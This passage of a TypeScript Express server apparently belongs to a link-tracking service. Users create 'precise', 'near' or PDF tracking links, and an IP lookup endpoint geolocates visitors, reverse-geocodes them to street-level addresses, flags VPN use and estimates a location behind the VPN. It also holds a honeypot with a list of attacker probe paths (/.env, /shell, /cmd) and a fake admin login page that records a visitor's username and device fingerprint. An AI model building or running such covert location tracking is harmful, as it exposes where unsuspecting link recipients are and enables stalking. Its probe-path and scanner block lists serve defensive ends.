  const tz = ip2LocData?.time_zone || ipApiData?.timezone || ipWhoData?.timezone?.id || 'UTC';

  let utcOffset = '+00:00';
  if (ip2LocData?.time_zone) {
    utcOffset = ip2LocData.time_zone.startsWith('+') || ip2LocData.time_zone.startsWith('-') ? `UTC${ip2LocData.time_zone}` : `UTC+${ip2LocData.time_zone}`;
  } else if (ipApiData?.offset != null) {
    const offsetHours = ipApiData.offset / 3600;
    const sign = offsetHours >= 0 ? '+' : '-';
    const absH = Math.abs(Math.floor(offsetHours)).toString().padStart(2, '0');
    utcOffset = `UTC${sign}${absH}:00`;
  } else if (ipWhoData?.timezone?.utc) {
    utcOffset = ipWhoData.timezone.utc;
  }

  const currency = ip2LocData?.currency || ipApiData?.currency || ipWhoData?.currency?.code || 'USD';
  const vpnProviderName = isProxy
    ? extractVpnProviderName(cleanIsp, cleanOrg, asName, ip2LocData?.proxy?.provider, ip2LocData?.proxy?.proxy_type)
    : 'None (Direct Connection)';

  if (country || city || lat != null) {
    return {
      ip,
      country: country || 'Unknown',
      countryCode,
      flag: getFlagEmoji(countryCode),
      region: region || 'Unknown',
      city: city || 'Unknown',
      zip: zip || 'Unknown',
      lat,
      lon,
      isp: cleanIsp || 'Unknown',
      org: cleanOrg || 'Unknown',
      asn: cleanAsn || 'Unknown',
      asName: asName || 'Unknown',
      reverseDns,
      ipRouting,
      usageType,
      isMobileCarrier,
      isProxyVpn: isProxy,
      isHosting,
      networkMedium,
      proxyType: isProxy ? (ip2LocData?.proxy?.proxy_type || (proxyCheckIsVpn ? 'VPN Detected (ProxyCheck)' : 'VPN / Proxy Active')) : null,
      vpnProviderName,
      dnsLeakIsp: formatDnsLeakIsp(reverseDns && reverseDns !== 'Unknown' ? reverseDns : null, cleanIsp),
      threatLevel,
      currency,
      timezone: tz,
      utcOffset,
      localTime: new Date().toLocaleTimeString(),
    };
  }

  return null;
}

// Reverse Geocoder for exact GPS Coordinates
async function fetchReverseGeo(lat: number, lon: number): Promise<{
  exactAddress: string | null;
  city: string | null;
  region: string | null;
  country: string | null;
  countryCode: string | null;
  zip: string | null;
} | null> {
  // 1. BigDataCloud high-resolution client geocoder
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 4000);
    const res = await fetch(
      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`,
      {
        signal: controller.signal,
        headers: { Accept: 'application/json' },
      }
    );
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json();
      const parts = [
        data.locality || data.city || data.localityInfo?.administrative?.[3]?.name || '',
        data.principalSubdivision || data.region || '',
        data.countryName || '',
      ].filter(Boolean);

      const exactAddress = parts.join(', ') || null;
      return {
        exactAddress: exactAddress || null,
        city: data.city || data.locality || data.localityInfo?.administrative?.[3]?.name || null,
        region: data.principalSubdivision || null,
        country: data.countryName || null,
        countryCode: data.countryCode || null,
        zip: data.postcode || null,
      };
    }
  } catch (err) {
    console.warn('BigDataCloud reverse geocode notice:', err);
  }

  // 2. OpenStreetMap Nominatim zoom 18 fallback
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3500);
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
      {
        signal: controller.signal,
        headers: {
          'User-Agent': 'AlQeyadah-AlZaeem-Tracker/1.0',
          'Accept-Language': 'en-US,en;q=0.9',
        },
      }
    );
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json();
      const addr = data.address || {};
      const street = addr.road || addr.street || addr.neighbourhood || addr.suburb || '';
      const city = addr.city || addr.town || addr.village || addr.county || '';
      const state = addr.state || addr.region || '';
      const country = addr.country || '';
      const zip = addr.postcode || '';
      const full = data.display_name || [street, city, state, country].filter(Boolean).join(', ');
      return {
        exactAddress: full || null,
        city: city || null,
        region: state || null,
        country: country || null,
        countryCode: addr.country_code ? addr.country_code.toUpperCase() : null,
        zip: zip || null,
      };
    }
  } catch (e) {
    console.warn('Nominatim fallback notice:', e);
  }

  return null;
}

interface BanRecord {
  id: string;
  ip: string;
  device: string;
  os: string;
  browser: string;
  country: string;
  city: string;
  timezone: string;
  userAgent: string;
  clientHints: string;
  reason: string;
  bannedAt: string;
  expiresAt: number;
  expiresAtIso: string;
}

function generateBanId(): string {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let id = '';
  for (let i = 0; i < 8; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}

function getHackDir(): string {
  return path.join(process.cwd(), 'HACK');
}

function getBlockJsonPath(): string {
  return path.join(getHackDir(), 'Block.json');
}

function getBlockFilePath(): string {
  return path.join(getHackDir(), 'Block.txt');
}

function getLogHoneyPath(): string {
  return path.join(getHackDir(), 'logHoney.txt');
}

function getActiveBans(): BanRecord[] {
  const jsonPath = getBlockJsonPath();
  const txtPath = getBlockFilePath();
  
  let records: BanRecord[] = [];
  if (fs.existsSync(jsonPath)) {
    try {
      const content = fs.readFileSync(jsonPath, 'utf-8');
      records = JSON.parse(content);
    } catch (e) {
      records = [];
    }
  }

  if (fs.existsSync(txtPath)) {
    try {
      const txtContent = fs.readFileSync(txtPath, 'utf-8');
      records = records.filter(r => txtContent.includes(r.id) || txtContent.includes(r.ip));
    } catch (e) {}
  }

  const now = Date.now();
  return records.filter(r => r.expiresAt > now);
}

function saveBans(bans: BanRecord[]) {
  const hackDir = getHackDir();
  if (!fs.existsSync(hackDir)) fs.mkdirSync(hackDir, { recursive: true });

  fs.writeFileSync(getBlockJsonPath(), JSON.stringify(bans, null, 2), 'utf-8');

  let txtContent = `======================================================================\n` +
    `# SM SECURITY ENFORCEMENT - ACTIVE BANNED CLIENTS (24-HOUR DURATION)\n` +
    `# Removing an ID or IP line below immediately lifts the ban!\n` +
    `======================================================================\n\n`;

  for (const b of bans) {
    txtContent += `[BAN_ID: ${b.id}]\n` +
      `IP: ${b.ip}\n` +
      `DEVICE: ${b.device} (${b.os} / ${b.browser})\n` +
      `LOCATION: ${b.country} - ${b.city}\n` +
      `TIMEZONE: ${b.timezone}\n` +
      `REASON: ${b.reason}\n` +
      `BANNED_AT: ${b.bannedAt}\n` +
      `EXPIRES_AT: ${b.expiresAtIso}\n` +
      `UA_CH: ${b.clientHints}\n` +
      `----------------------------------------------------------------------\n\n`;
  }

  fs.writeFileSync(getBlockFilePath(), txtContent, 'utf-8');
}

function recordBan(record: BanRecord) {
  const bans = getActiveBans();
  const existingIdx = bans.findIndex(b => b.id === record.id || b.ip === record.ip);
  if (existingIdx >= 0) {
    bans[existingIdx] = record;
  } else {
    bans.unshift(record);
  }
  saveBans(bans);

  const logEntry = `============================================================\n` +
    `[${record.bannedAt}] INCIDENT ID: #${record.id}\n` +
    `ACTION: ${record.reason}\n` +
    `TARGET IP: ${record.ip}\n` +
    `LOCATION: ${record.country} | ${record.city}\n` +
    `TIMEZONE: ${record.timezone}\n` +
    `DEVICE: ${record.device} | OS: ${record.os} | BROWSER: ${record.browser}\n` +
    `USER-AGENT: ${record.userAgent}\n` +
    `UA-CH (CLIENT HINTS): ${record.clientHints}\n` +
    `BAN DURATION: 24 HOURS (Expires: ${record.expiresAtIso})\n` +
    `STATUS: PERMANENT 24H LOCKOUT ENFORCED\n` +
    `============================================================\n\n`;

  try {
    fs.appendFileSync(getLogHoneyPath(), logEntry, 'utf-8');
  } catch (e) {}
}

function checkIsBanned(req: express.Request): BanRecord | null {
  const ip = (
    (req.headers['cf-connecting-ip'] as string) ||
    (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
    (req.headers['x-real-ip'] as string) ||
    req.socket.remoteAddress ||
    '127.0.0.1'
  ).replace('::ffff:', '');

  const cookieHeader = req.headers.cookie || '';
  const banCookieMatch = cookieHeader.match(/sm_ban_id=([A-Za-z0-9_-]+)/);
  const banIdFromCookie = banCookieMatch ? banCookieMatch[1] : null;

  const activeBans = getActiveBans();
  if (activeBans.length === 0) return null;

  const matched = activeBans.find(b => b.ip === ip || (banIdFromCookie && b.id === banIdFromCookie));
  return matched || null;
}

function renderBannedHtml(ban: BanRecord): string {
  return `<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🔒 تم حظر الوصول - SM Security</title>
  <link rel="icon" type="image/jpeg" href="/Favicon.jpg">
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Cairo', sans-serif; }
    .font-mono { font-family: 'JetBrains Mono', monospace; }
  </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex flex-col justify-between p-4 selection:bg-red-600 selection:text-white">
  <div class="max-w-2xl w-full mx-auto my-auto py-8 flex flex-col items-center text-center gap-6">
    <div class="relative">
      <div class="absolute -inset-2 bg-red-600/30 rounded-full blur-xl animate-pulse"></div>
      <img src="/Favicon.jpg" alt="SM Security" class="relative w-24 h-24 rounded-full border-4 border-red-600 shadow-2xl object-cover" />
    </div>

    <div class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-red-950/80 border border-red-500/40 text-red-400 text-xs font-black tracking-wide uppercase">
      <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
      🔒 حظر أمني مشدد لمدة 24 ساعة | Security Ban Active
    </div>

    <div class="bg-slate-900/90 border border-red-900/50 rounded-2xl p-6 shadow-2xl backdrop-blur-md flex flex-col gap-4 text-center w-full">
      <div class="text-xs font-mono font-bold text-red-400 bg-red-950/50 px-3 py-1 rounded-lg border border-red-900/40 self-center">
        INCIDENT REF: #${ban.id}
      </div>

      <p class="text-base sm:text-lg font-black text-red-200 leading-relaxed">
        ممتاز أنك وصلت لحد هنا لكن ده مكانك الغلط وغير مصرح أنك تجرب، مهاراتك عالية وسيتم حظرك لمده 24 ساعه مع تحياتي القيـــــــــاده
      </p>

      <p class="text-xs sm:text-sm font-medium text-slate-300 leading-relaxed border-t border-slate-800 pt-3" dir="ltr">
        Excellent that you reached here, but this is the wrong place and you are not authorized to test your skills. Your skills are high and you will be banned for 24 hours, with greetings from the Command.
      </p>

      <div class="bg-slate-950/80 rounded-xl p-4 border border-slate-800 flex flex-col gap-2 mt-2">
        <span class="text-xs text-slate-400 font-bold">الوقت المتبقي لانتهاء الحظر الأمني:</span>
        <div id="countdown" class="text-2xl sm:text-3xl font-black font-mono text-emerald-400 tracking-wider">
          --:--:--
        </div>
      </div>

      <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-right text-xs bg-slate-950/40 rounded-xl p-3 border border-slate-800/60 font-mono text-slate-400 mt-1">
        <div><strong class="text-slate-300">IP:</strong> ${ban.ip}</div>
        <div><strong class="text-slate-300">الموقع:</strong> ${ban.country} - ${ban.city}</div>
        <div><strong class="text-slate-300">الجهاز:</strong> ${ban.device}</div>
        <div><strong class="text-slate-300">النظام:</strong> ${ban.os}</div>
      </div>
    </div>
  </div>

  <footer class="w-full text-center py-4 border-t border-slate-900 text-xs text-slate-500 font-bold">
    حقوق التطوير محفوظة © محمد أبو السعود (القيادة) 2026 | Development Rights Reserved © Mohamed Abu AlSaud
  </footer>

  <script>
    const expiresAt = ${ban.expiresAt};
    function updateTimer() {
      const now = Date.now();
      const diff = expiresAt - now;
      if (diff <= 0) {
        document.getElementById('countdown').innerText = 'انتهى الحظر - جارٍ إعادة التحميل...';
        setTimeout(() => location.reload(), 2000);
        return;
      }
      const hours = Math.floor(diff / (1000 * 60 * 60));
      const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const secs = Math.floor((diff % (1000 * 60)) / 1000);
      document.getElementById('countdown').innerText = 
        String(hours).padStart(2, '0') + ' : ' + 
        String(mins).padStart(2, '0') + ' : ' + 
        String(secs).padStart(2, '0');
    }
    updateTimer();
    setInterval(updateTimer, 1000);
  </script>
</body>
</html>`;
}

function renderFakeAdminHtml(ip: string, userAgent: string): string {
  return `<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة تحكم النظام - SM Command Portal</title>
  <link rel="icon" type="image/jpeg" href="/Favicon.jpg">
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Cairo', sans-serif; }
    .font-mono { font-family: 'JetBrains Mono', monospace; }
  </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col justify-between p-4 selection:bg-indigo-600 selection:text-white">
  <div class="max-w-md w-full mx-auto my-auto py-8">
    <div id="login-card" class="bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-md flex flex-col gap-6">
      <div class="flex flex-col items-center text-center gap-3">
        <div class="relative">
          <img src="/Favicon.jpg" alt="SM Security" class="w-16 h-16 rounded-full border-2 border-indigo-600 shadow-xl object-cover" />
        </div>
        <div>
          <h2 class="text-xl font-black text-white">مركز إدارة وتحكم القيادة</h2>
          <p class="text-xs text-slate-400 font-mono mt-0.5">SM Security Control Console v1.0</p>
        </div>
      </div>

      <form id="admin-form" class="flex flex-col gap-4">
        <div class="flex flex-col gap-1.5 text-right">
          <label class="text-xs font-bold text-slate-300">اسم المستخدم أو المعرف الإداري</label>
          <input id="inp-user" type="text" placeholder="admin / root / id" required class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-white text-sm focus:outline-hidden focus:border-indigo-500 text-left font-mono" />
        </div>

        <div class="flex flex-col gap-1.5 text-right">
          <label class="text-xs font-bold text-slate-300">كلمة المرور المشفرة (Master Key)</label>
          <input id="inp-pass" type="password" placeholder="••••••••••••" required class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-white text-sm focus:outline-hidden focus:border-indigo-500 text-left font-mono" />
        </div>

        <div class="flex flex-col gap-1.5 text-right">
          <label class="text-xs font-bold text-slate-300">رمز التحقق الأمني (2FA PIN)</label>
          <input id="inp-pin" type="text" placeholder="6-digit PIN" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-white text-sm focus:outline-hidden focus:border-indigo-500 text-center font-mono tracking-widest" />
        </div>

        <button type="submit" id="btn-submit" class="w-full mt-2 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-700 active:scale-98 text-white font-bold text-sm shadow-lg shadow-indigo-600/30 transition-all cursor-pointer">
          تسجيل الدخول إلى الخادم
        </button>
      </form>

      <div class="text-center text-[10px] text-slate-500 font-mono">
        PROTECTED BY SM CYBER DEFENSE SHIELD • IP LOGGED
      </div>
    </div>

    <div id="trap-card" class="hidden bg-slate-900 border-2 border-red-600 rounded-3xl p-6 sm:p-8 shadow-2xl flex flex-col items-center text-center gap-5 animate-bounce-once">
      <div class="relative">
        <div class="absolute -inset-3 bg-red-600/40 rounded-full blur-xl animate-pulse"></div>
        <img src="/Favicon.jpg" alt="SM Security" class="relative w-20 h-20 rounded-full border-4 border-red-600 shadow-2xl object-cover" />
      </div>

      <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-950 border border-red-600 text-red-400 text-xs font-black">
        <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
        🚨 إنذار أمني: كشف محاولة اختراق
      </div>

      <div class="flex flex-col gap-3">
        <p class="text-base font-black text-red-200 leading-relaxed">
          ممتاز أنك وصلت لحد هنا لكن ده مكانك الغلط وغير مصرح أنك تجرب، مهاراتك عالية وسيتم حظرك لمده 24 ساعه مع تحياتي القيـــــــــاده
        </p>

        <p class="text-xs font-medium text-slate-300 leading-relaxed border-t border-slate-800 pt-2" dir="ltr">
          Excellent that you reached here, but this is the wrong place and you are not authorized to test your skills. Your skills are high and you will be banned for 24 hours, with greetings from the Command.
        </p>
      </div>

      <div class="w-full bg-slate-950 rounded-xl p-3 border border-slate-800 flex flex-col gap-1">
        <span class="text-xs text-slate-400 font-bold">جاري تفعيل الحظر الشامل لجهازك خلال:</span>
        <span id="trap-timer" class="text-2xl font-black font-mono text-red-500">30</span>
      </div>
    </div>
  </div>

  <footer class="w-full text-center py-4 border-t border-slate-900 text-xs text-slate-500 font-bold">
    حقوق التطوير محفوظة © محمد أبو السعود (القيادة) 2026 | Development Rights Reserved © Mohamed Abu AlSaud
  </footer>

  <script>
    let triggered = false;

    async function triggerTrap() {
      if (triggered) return;
      triggered = true;

      document.getElementById('login-card').classList.add('hidden');
      document.getElementById('trap-card').classList.remove('hidden');

      const payload = {
        path: window.location.pathname,
        username: document.getElementById('inp-user')?.value || '',
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency || 0
      };

      try {
        await fetch('/api/trigger-ban', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {}

      let remaining = 30;
      const tElem = document.getElementById('trap-timer');
      const interval = setInterval(() => {
        remaining -= 1;
        if (tElem) tElem.innerText = remaining;
        if (remaining <= 0) {
          clearInterval(interval);
          window.location.href = '/';
        }
      }, 1000);
    }

    document.getElementById('admin-form').addEventListener('submit', (e) => {
      e.preventDefault();
      triggerTrap();
    });

    setTimeout(() => {
      triggerTrap();
    }, 10000);
  </script>
</body>
</html>`;
}

async function startServer() {
  const app = express();
  const db = loadDatabase();

  app.set('trust proxy', 1);

  app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false,
  }));

  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 300,
    standardHeaders: true,
    legacyHeaders: false,
    message: { error: 'Too many requests, please try again later.' }
  });
  app.use('/api/', limiter);

  app.use(express.json({ limit: '30mb' }));
  app.use(express.urlencoded({ extended: true, limit: '30mb' }));

  app.get(['/Favicon.jpg', '/favicon.jpg', '/public/Favicon.jpg'], (req, res) => {
    const p = path.join(process.cwd(), 'Favicon.jpg');
    if (fs.existsSync(p)) {
      res.setHeader('Content-Type', 'image/jpeg');
      res.setHeader('Cache-Control', 'public, max-age=86400');
      return res.sendFile(p);
    }
    const p2 = path.join(process.cwd(), 'public', 'Favicon.jpg');
    if (fs.existsSync(p2)) {
      res.setHeader('Content-Type', 'image/jpeg');
      return res.sendFile(p2);
    }
    res.status(404).send('Not found');
  });

  app.use(async (req, res, next) => {
    if (
      req.path === '/Favicon.jpg' ||
      req.path === '/favicon.jpg' ||
      req.path === '/favicon.svg' ||
      req.path === '/favicon.ico' ||
      req.path === '/api/trigger-ban'
    ) {
      return next();
    }

    const banned = checkIsBanned(req);
    if (banned) {
      const acceptsHtml = req.headers.accept?.includes('text/html');
      if (acceptsHtml && !req.path.startsWith('/api/')) {
        return res.status(403).send(renderBannedHtml(banned));
      }

      return res.status(403).json({
        error: 'Security Lockout Enforced',
        banId: banned.id,
        messageAr: 'ممتاز أنك وصلت لحد هنا لكن ده مكانك الغلط وغير مصرح أنك تجرب، مهاراتك عالية وسيتم حظرك لمده 24 ساعه مع تحياتي القيـــــــــاده',
        messageEn: 'Excellent that you reached here, but this is the wrong place and you are not authorized to test your skills. Your skills are high and you will be banned for 24 hours, with greetings from the Command.',
        expiresAt: banned.expiresAtIso,
        status: 'BANNED_FOR_24_HOURS'
      });
    }

    next();
  });

  const honeyPaths = [
    '/admin', '/wp-admin', '/wp-login.php', '/.env', '/.git', 
    '/config', '/phpmyadmin', '/api/admin', '/shell', '/cmd',
    '/api/v1/user', '/backup', '/db', '/v1', '/v2', '/auth',
    '/cpanel', '/backend', '/login', '/dashboard/admin'
  ];

  app.use(async (req, res, next) => {
    const lowerPath = req.path.toLowerCase();
    if (honeyPaths.some(p => lowerPath === p || lowerPath.startsWith(p + '/'))) {
      const ip = (
        (req.headers['cf-connecting-ip'] as string) ||
        (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
        (req.headers['x-real-ip'] as string) ||
        req.socket.remoteAddress ||
        '127.0.0.1'
      ).replace('::ffff:', '');

      const userAgent = (req.headers['user-agent'] as string) || 'Unknown';
      const acceptsHtml = req.headers.accept?.includes('text/html');

      if (acceptsHtml) {
        return res.send(renderFakeAdminHtml(ip, userAgent));
      }

      const clientHints = [
        `sec-ch-ua: ${req.headers['sec-ch-ua'] || 'none'}`,
        `sec-ch-ua-platform: ${req.headers['sec-ch-ua-platform'] || 'none'}`,
        `sec-ch-ua-mobile: ${req.headers['sec-ch-ua-mobile'] || 'none'}`
      ].join(' | ');

      const { os, device } = cleanOS(userAgent, null);
      let country = 'Unknown';
      let city = 'Unknown';
      let timezone = 'Unknown';

      try {
        const geo = await fetchGeo(ip);
        if (geo) {
          country = geo.country || 'Unknown';
          city = geo.city || 'Unknown';
          timezone = geo.timezone || 'Unknown';
        }
      } catch (e) {}

      const banId = generateBanId();
      const bannedAt = new Date().toISOString();
      const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
      const expiresAtIso = new Date(expiresAt).toISOString();

      recordBan({
        id: banId,
        ip,
        device,
        os,
        browser: 'CLI/Scanner Tool',
        country,
        city,
        timezone,
        userAgent,
        clientHints,
        reason: `CLI/Scanner Honeypot Trigger (${req.path})`,
        bannedAt,
        expiresAt,
        expiresAtIso
      });

      res.setHeader('Set-Cookie', `sm_ban_id=${banId}; Path=/; Max-Age=86400; SameSite=Lax`);

      return res.status(403).json({ 
        error: 'Security Access Violation Recorded', 
        banId,
        messageAr: 'ممتاز أنك وصلت لحد هنا لكن ده مكانك الغلط وغير مصرح أنك تجرب، مهاراتك عالية وسيتم حظرك لمده 24 ساعه مع تحياتي القيـــــــــاده',
        messageEn: 'Excellent that you reached here, but this is the wrong place and you are not authorized to test your skills. Your skills are high and you will be banned for 24 hours, with greetings from the Command.',
        code: 'HONEYPOT_TRAP' 
      });
    }
    next();
  });

  app.post('/api/trigger-ban', async (req, res) => {
    try {
      const ip = (
        (req.headers['cf-connecting-ip'] as string) ||
        (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
        (req.headers['x-real-ip'] as string) ||
        req.socket.remoteAddress ||
        '127.0.0.1'
      ).replace('::ffff:', '');

      const userAgent = (req.headers['user-agent'] as string) || 'Unknown';
      const body = req.body || {};
      const { os, device } = cleanOS(userAgent, null);

      let country = 'Unknown';
      let city = 'Unknown';
      let timezone = body.timezone || 'Unknown';

      try {
        const geo = await fetchGeo(ip);
        if (geo) {
          country = geo.country || 'Unknown';
          city = geo.city || 'Unknown';
          if (!body.timezone) timezone = geo.timezone || 'Unknown';
        }
      } catch (e) {}

      const clientHints = [
        `sec-ch-ua: ${req.headers['sec-ch-ua'] || 'none'}`,
        `sec-ch-ua-platform: ${req.headers['sec-ch-ua-platform'] || 'none'}`,
        `sec-ch-ua-mobile: ${req.headers['sec-ch-ua-mobile'] || 'none'}`,
        `screen: ${body.screenWidth}x${body.screenHeight}`,
        `lang: ${body.languages}`
      ].join(' | ');

      const banId = generateBanId();
      const bannedAt = new Date().toISOString();
      const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
      const expiresAtIso = new Date(expiresAt).toISOString();

      recordBan({
        id: banId,
        ip,
        device: body.platform ? `${device} (${body.platform})` : device,
        os,
        browser: 'Web Browser',
        country,
        city,
        timezone,
        userAgent,
        clientHints,
        reason: `Admin Portal Honeypot Access (${body.path || '/admin'})`,
        bannedAt,
        expiresAt,
        expiresAtIso
      });

      res.setHeader('Set-Cookie', `sm_ban_id=${banId}; Path=/; Max-Age=86400; SameSite=Lax`);
      res.json({ success: true, banId, expiresAt: expiresAtIso });
    } catch (e) {
      res.status(500).json({ error: 'Failed to record ban' });
    }
  });

  app.use((req, res, next) => {
    const origin = req.headers.origin || req.headers.referer || '';
    const host = req.headers.host || '';

    res.setHeader('Access-Control-Allow-Origin', origin || '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-user-token, x-sm-auth, x-app-client');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('X-XSS-Protection', '1; mode=block');

    if (req.method === 'OPTIONS') {
      res.status(200).end();
      return;
    }

    if (
      req.path.startsWith('/api/') &&
      !req.path.startsWith('/api/health') &&
      !req.path.startsWith('/api/visits') &&
      !req.path.startsWith('/api/trigger-ban') &&
      !req.path.startsWith('/api/pdf/t/') &&
      !req.path.startsWith('/api/pdf/generate/')
    ) {
      const userAgent = (req.headers['user-agent'] || '').toLowerCase();
      const isAutomatedTool = userAgent.includes('curl/') || userAgent.includes('python-requests') || userAgent.includes('postmanruntime');
      
      if (isAutomatedTool && !req.headers['x-sm-auth']) {
        return res.status(403).json({
          error: 'Access Denied: Direct external API consumption prohibited.',
          code: 'API_PROTECTED'
        });
      }
    }

    next();
  });

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
  });

  // Dedicated IP2Location Intelligence Lookup API
  app.get(['/api/ip-lookup', '/api/ip-lookup/:ip'], async (req, res) => {
    try {
      let targetIp = req.params.ip;
      if (!targetIp || targetIp === 'me' || targetIp === 'self') {
        targetIp =
          (req.headers['cf-connecting-ip'] as string) ||
          (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
          (req.headers['x-real-ip'] as string) ||
          req.socket.remoteAddress ||
          '127.0.0.1';
      }

      if (targetIp.startsWith('::ffff:')) {
        targetIp = targetIp.replace('::ffff:', '');
      }

      const geo = await fetchGeo(targetIp);
      if (!geo) {
        res.status(404).json({ error: 'Failed to retrieve IP intelligence' });
        return;
      }

      let exactAddress = `${geo.city || ''} ${geo.region || ''} ${geo.country || ''}`.trim();
      if (geo.lat && geo.lon) {
        const reverse = await fetchReverseGeo(geo.lat, geo.lon);
        if (reverse?.exactAddress) {
          exactAddress = reverse.exactAddress;
        }
      }

      const isProxy = geo.isProxyVpn;
      const candidateOriginalLocation = isProxy
        ? `Estimated based on ISP (${geo.isp || 'Provider'}) & AS Routing Network`
        : 'Direct Authentic Connection (No VPN or Proxy detected)';
      const mismatchScore = isProxy ? 85 : 0;

      res.json({
        success: true,
        data: {
          ...geo,
          exactAddress,
          candidateOriginalLocation,
          mismatchScore,
          vpnProviderName: geo.vpnProviderName || (isProxy ? 'Generic VPN/Proxy Server' : 'None (Direct Connection)'),
          dnsLeakIsp: formatDnsLeakIsp(geo.dnsLeakIsp, geo.isp),
        },
      });
    } catch (err) {
      console.error('IP lookup API error:', err);
      res.status(500).json({ error: 'Internal server error during IP lookup' });
    }
  });

  // Create new tracking link
  app.post('/api/links', (req, res) => {
    try {
      const { originalUrl, mode, userToken } = req.body;
      
      // Basic validation
      if (!mode || !['precise', 'near', 'pdf'].includes(mode)) {
        res.status(400).json({ error: 'Invalid mode' });
        return;
      }
      if (userToken && typeof userToken !== 'string') {
        res.status(400).json({ error: 'Invalid userToken' });
        return;
      }
      
      if (!originalUrl && mode !== 'pdf') {
        res.status(400).json({ error: 'Original URL is required' });
        return;
      }

      const clientToken = userToken || generateToken(16);

      // Check max links limit (5 per user)
      const userLinks = db.links.filter((l) => l.userToken === clientToken);
      if (userLinks.length >= 5) {
        res.status(403).json({ 
          error: 'LIMIT_REACHED', 
          message: 'لقد وصلت للحد الأقصى (5 روابط). يرجى حذف رابط حالي لإنشاء رابط جديد.' 
        });
        return;
      }

      // Check PDF limit (5 per user)
      if (mode === 'pdf' && userLinks.filter(l => l.mode === 'pdf').length >= 5) {
        res.status(403).json({ error: 'PDF_LIMIT', message: 'مسموح بـ 5 ملفات PDF فقط.' });
        return;
      }

      let sanitizedUrl = (originalUrl || 'https://tracking.internal').trim();
      if (!sanitizedUrl.startsWith('http://') && !sanitizedUrl.startsWith('https://')) {
        sanitizedUrl = 'https://' + sanitizedUrl;
      }

      let code = generateCode(8);
      while (db.links.some((l) => l.code === code)) {
        code = generateCode(8);
      }

      const newLink: StoredLink = {
        id: generateToken(12),
        code,
        originalUrl: sanitizedUrl,
        mode: mode === 'precise' ? 'precise' : (mode === 'pdf' ? 'pdf' : 'near'),
        userToken: clientToken,
        createdAt: new Date().toISOString(),
        visitCount: 0,
      };

      db.links.unshift(newLink);
      if (typeof db.totalLinksCreated === 'number') {
        db.totalLinksCreated += 1;
      } else {
        db.totalLinksCreated = db.links.length;
      }
      saveDatabase(db);

      res.json({
        success: true,
        link: newLink,
      });
    } catch (err) {
      console.error('Create link error:', err);
      res.status(500).json({ error: 'Failed to create link' });
    }
  });

  // Get link info and visit records
  app.get('/api/links/:code', (req, res) => {
    try {
      const { code } = req.params;
      const link = db.links.find((l) => l.code === code);
      if (!link) {
        res.status(404).json({ error: 'Link not found' });
        return;
      }

      const visits = db.visits
        .filter((v) => v.code === code || v.linkId === link.id)
        .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());

      res.json({
        success: true,
        link,
        visits,
      });
    } catch (err) {
      console.error('Get link error:', err);
      res.status(500).json({ error: 'Failed to get link info' });
    }
  });

  // Delete link and all associated visits
  app.delete('/api/links/:code', (req, res) => {
    try {
      const { code } = req.params;
      const linkIndex = db.links.findIndex((l) => l.code === code);
      if (linkIndex === -1) {
        res.status(404).json({ error: 'Link not found' });
        return;
      }

      const linkId = db.links[linkIndex].id;
      db.links.splice(linkIndex, 1);
